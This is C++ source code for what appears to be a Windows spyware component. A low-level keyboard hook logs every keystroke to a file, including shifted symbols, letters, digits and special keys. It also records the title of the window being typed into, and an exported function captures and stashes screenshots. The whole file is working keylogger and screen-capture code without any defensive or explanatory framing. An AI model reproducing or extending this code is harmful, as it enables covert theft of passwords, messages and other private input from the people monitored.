#include "factory.h"
#include "io.h"
#include "img.h"

VOID process_kb_hook_data(WPARAM wParam, LPARAM lParam)
{
#ifdef SPY_LOG_WINTEXT
	static HWND oldWindowHandle = NULL;// current window handle which typed on
	static char windowText[SPY_MAX_WINTEXT_LENGTH];// buffer for saving window title
#endif
	static bool shift = false;// shift key state(down/up?)

	LOG("enter processing keyboard hook data...");
	const KBDLLHOOKSTRUCT * kbData = (KBDLLHOOKSTRUCT *) lParam;
	
	if (kbData->vkCode == VK_LSHIFT || kbData->vkCode == VK_RSHIFT)
	{
		shift = (wParam == WM_KEYDOWN);
		LOG("shift is %s", shift ? "ON" : "OFF");
	}

	if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
	{
		LOG("key has been pressed!");
		KBHookFile * kbFile = get_kbhook_file();
#ifdef SPY_LOG_WINTEXT
		// save window text which typed on it
		// if a new file just has been created then write window text first
		const HWND newWindowHandle = GetForegroundWindow();
		if (oldWindowHandle != newWindowHandle || kbFile->get_position() == 0)
		{
			const int ret = GetWindowTextA(newWindowHandle, windowText, SPY_MAX_WINTEXT_LENGTH);
			LOG("window text is '%s'", windowText);
			kbFile->write("\n", 1);
			kbFile->write(windowText, ret);
			kbFile->write("\n", 1);
			oldWindowHandle = newWindowHandle;
		}
#endif
		const bool caps = GetKeyState(VK_CAPITAL) < 0;// check caps lock pressed?
		LOG("caps is %s", caps ? "ON" : "OFF");
		LOG("write pressed key...");
		switch (kbData->vkCode)
		{
		// number keys
#ifdef SPY_LOG_NUMBER
		case 0x30: kbFile->write(shift ? ")" : "0", 1); break;
		case 0x31: kbFile->write(shift ? "!" : "1", 1); break;
		case 0x32: kbFile->write(shift ? "@" : "2", 1); break;
		case 0x33: kbFile->write(shift ? "#" : "3", 1); break;
		case 0x34: kbFile->write(shift ? "$" : "4", 1); break;
		case 0x35: kbFile->write(shift ? "%" : "5", 1); break;
		case 0x36: kbFile->write(shift ? "^" : "6", 1); break;
		case 0x37: kbFile->write(shift ? "&" : "7", 1); break;
		case 0x38: kbFile->write(shift ? "*" : "8", 1); break;
		case 0x39: kbFile->write(shift ? "(" : "9", 1); break;
#else
		case 0x30:
		case 0x31:
		case 0x32:
		case 0x33:
		case 0x34:
		case 0x35:
		case 0x36:
		case 0x37:
		case 0x38:
		case 0x39: break;
#endif
		// numpad keys
#ifdef SPY_LOG_NUMPAD
		case 0x60: kbFile->write("0", 1); break;
		case 0x61: kbFile->write("1", 1); break;
		case 0x62: kbFile->write("2", 1); break;
		case 0x63: kbFile->write("3", 1); break;
		case 0x64: kbFile->write("4", 1); break;
		case 0x65: kbFile->write("5", 1); break;
		case 0x66: kbFile->write("6", 1); break;
		case 0x67: kbFile->write("7", 1); break;
		case 0x68: kbFile->write("8", 1); break;
		case 0x69: kbFile->write("9", 1); break;
#else
		case 0x60:
		case 0x61:
		case 0x62:
		case 0x63:
		case 0x64:
		case 0x65:
		case 0x66:
		case 0x67:
		case 0x68:
		case 0x69: break;
#endif
		// character keys
#ifdef SPY_LOG_CHARACTER
		case 0x41: kbFile->write(caps ? (shift ? "a" : "A") : (shift ? "A" : "a"), 1); break;
		case 0x42: kbFile->write(caps ? (shift ? "b" : "B") : (shift ? "B" : "b"), 1); break;
		case 0x43: kbFile->write(caps ? (shift ? "c" : "C") : (shift ? "C" : "c"), 1); break;
		case 0x44: kbFile->write(caps ? (shift ? "d" : "D") : (shift ? "D" : "d"), 1); break;
		case 0x45: kbFile->write(caps ? (shift ? "e" : "E") : (shift ? "E" : "e"), 1); break;
		case 0x46: kbFile->write(caps ? (shift ? "f" : "F") : (shift ? "F" : "f"), 1); break;
		case 0x47: kbFile->write(caps ? (shift ? "g" : "G") : (shift ? "G" : "g"), 1); break;
		case 0x48: kbFile->write(caps ? (shift ? "h" : "H") : (shift ? "H" : "h"), 1); break;
		case 0x49: kbFile->write(caps ? (shift ? "i" : "I") : (shift ? "I" : "i"), 1); break;
		case 0x4A: kbFile->write(caps ? (shift ? "j" : "J") : (shift ? "J" : "j"), 1); break;
		case 0x4B: kbFile->write(caps ? (shift ? "k" : "K") : (shift ? "K" : "k"), 1); break;
		case 0x4C: kbFile->write(caps ? (shift ? "l" : "L") : (shift ? "L" : "l"), 1); break;
		case 0x4D: kbFile->write(caps ? (shift ? "m" : "M") : (shift ? "M" : "m"), 1); break;
		case 0x4E: kbFile->write(caps ? (shift ? "n" : "N") : (shift ? "N" : "n"), 1); break;
		case 0x4F: kbFile->write(caps ? (shift ? "o" : "O") : (shift ? "O" : "o"), 1); break;
		case 0x50: kbFile->write(caps ? (shift ? "p" : "P") : (shift ? "P" : "p"), 1); break;
		case 0x51: kbFile->write(caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"), 1); break;
		case 0x52: kbFile->write(caps ? (shift ? "r" : "R") : (shift ? "R" : "r"), 1); break;
		case 0x53: kbFile->write(caps ? (shift ? "s" : "S") : (shift ? "S" : "s"), 1); break;
		case 0x54: kbFile->write(caps ? (shift ? "t" : "T") : (shift ? "T" : "t"), 1); break;
		case 0x55: kbFile->write(caps ? (shift ? "u" : "U") : (shift ? "U" : "u"), 1); break;
		case 0x56: kbFile->write(caps ? (shift ? "v" : "V") : (shift ? "V" : "v"), 1); break;
		case 0x57: kbFile->write(caps ? (shift ? "w" : "W") : (shift ? "W" : "w"), 1); break;
		case 0x58: kbFile->write(caps ? (shift ? "x" : "X") : (shift ? "X" : "x"), 1); break;
		case 0x59: kbFile->write(caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"), 1); break;
		case 0x5A: kbFile->write(caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"), 1); break;
#else
		case 0x41:
		case 0x42:
		case 0x43:
		case 0x44:
		case 0x45:
		case 0x46:
		case 0x47:
		case 0x48:
		case 0x49:
		case 0x4A:
		case 0x4B:
		case 0x4C:
		case 0x4D:
		case 0x4E:
		case 0x4F:
		case 0x50:
		case 0x51:
		case 0x52:
		case 0x53:
		case 0x54:
		case 0x55:
		case 0x56:
		case 0x57:
		case 0x58:
		case 0x59:
		case 0x5A: break;
#endif
		// special keys
#ifdef SPY_LOG_SPECIAL
		case VK_SPACE:		kbFile->write(" ", 1); break;
		case VK_RETURN:		kbFile->write("\n", 1); break;
		case VK_TAB:		kbFile->write("\t", 1); break;
		case VK_ESCAPE:		kbFile->write("[ESC]", 5); break;
		case VK_LEFT:		kbFile->write("[LEFT]", 6); break;
		case VK_RIGHT:		kbFile->write("[RIGHT]", 7); break;
		case VK_UP:			kbFile->write("[UP]", 4); break;
		case VK_DOWN:		kbFile->write("[DOWN]", 6); break;
		case VK_END:		kbFile->write("[END]", 5); break;
		case VK_HOME:		kbFile->write("[HOME]", 6); break;
		case VK_DELETE:		kbFile->write("[DEL]", 5); break;
		case VK_BACK:		kbFile->write("[BACK]", 6); break;
		case VK_INSERT:		kbFile->write("[INS]", 5); break;
		case VK_LCONTROL:
		case VK_RCONTROL:	kbFile->write("[CTRL]", 6); break;
		case VK_LMENU:
		case VK_RMENU:		kbFile->write("[ALT]", 5); break;
		case VK_F1:			kbFile->write("[F1]", 4); break;
		case VK_F2:			kbFile->write("[F2]", 4); break;
		case VK_F3:			kbFile->write("[F3]", 4); break;
		case VK_F4:			kbFile->write("[F4]", 4); break;
		case VK_F5:			kbFile->write("[F5]", 4); break;
		case VK_F6:			kbFile->write("[F6]", 4); break;
		case VK_F7:			kbFile->write("[F7]", 4); break;
		case VK_F8:			kbFile->write("[F8]", 4); break;
		case VK_F9:			kbFile->write("[F9]", 4); break;
		case VK_F10:		kbFile->write("[F10]", 5); break;
		case VK_F11:		kbFile->write("[F11]", 5); break;
		case VK_F12:		kbFile->write("[F12]", 5); break;
#else
		case VK_SPACE:		
		case VK_RETURN:		
		case VK_TAB:		
		case VK_ESCAPE:		
		case VK_LEFT:		
		case VK_RIGHT:
		case VK_UP:			
		case VK_DOWN:
		case VK_END:		
		case VK_HOME:		
		case VK_DELETE:		
		case VK_BACK:		
		case VK_INSERT:		
		case VK_LCONTROL:
		case VK_RCONTROL:	
		case VK_LMENU:
		case VK_RMENU:		
		case VK_F1:
		case VK_F2:			
		case VK_F3:			
		case VK_F4:			
		case VK_F5:			
		case VK_F6:			
		case VK_F7:			
		case VK_F8:			
		case VK_F9:			
		case VK_F10:		
		case VK_F11:		
		case VK_F12: break;
#endif
		// symbol keys
#ifdef SPY_LOG_SYMBOL
		case VK_OEM_1: kbFile->write(shift ? ":" : ";", 1); break;
		case VK_OEM_2: kbFile->write(shift ? "?" : "/", 1); break;
		case VK_OEM_3: kbFile->write(shift ? "~" : "`", 1); break;
		case VK_OEM_4: kbFile->write(shift ? "{" : "[", 1); break;
		case VK_OEM_5: kbFile->write(shift ? "|" : "\\", 1); break;
		case VK_OEM_6: kbFile->write(shift ? "}" : "]", 1); break;
		case VK_OEM_7: kbFile->write(shift ? "\"" : "'", 1); break;
		case VK_OEM_PLUS: kbFile->write(shift ? "+" : "=", 1); break;
		case VK_OEM_COMMA: kbFile->write(shift ? "<" : ",", 1); break;
		case VK_OEM_MINUS: kbFile->write(shift ? +"_" : "-", 1); break;
		case VK_OEM_PERIOD: kbFile->write(shift ? ">" : ".", 1); break;
#else
		case VK_OEM_1: 
		case VK_OEM_2: 
		case VK_OEM_3: 
		case VK_OEM_4: 
		case VK_OEM_5: 
		case VK_OEM_6: 
		case VK_OEM_7: 
		case VK_OEM_PLUS:
		case VK_OEM_COMMA: 
		case VK_OEM_MINUS: 
		case VK_OEM_PERIOD: break;
#endif
		// unknown keys
#ifdef SPY_LOG_UNKNOWN
		default:
			DWORD _lparam = (kbData->scanCode << 16) | (kbData->flags << 24);
			char key[16];
			GetKeyNameTextA(_lparam, key, 15);
			LOG("write unknown key is '%s'", key);
			kbFile->write(key, strlen(key));
			break;
#endif
		}
	}
	LOG("finish processing keyboard hook data!");
}


EXPORT VOID take_screenshot()
{
	LOG("taking a screenshot");
	SSHookFile * hookFile = get_sshook_file();
	Screenshot * screenshot = new Screenshot(0.5f, hookFile);
	LOG("capturing screen and saving to file");
	screenshot->capture_to_file();
	LOG("done!");
	delete screenshot;
	LOG("release screenshot object")
	force_stash_sshook_file();
	LOG("stash screenshot file");
}

EXPORT VOID quit()
{
	LOG("quit!");
	close_all_files();
}
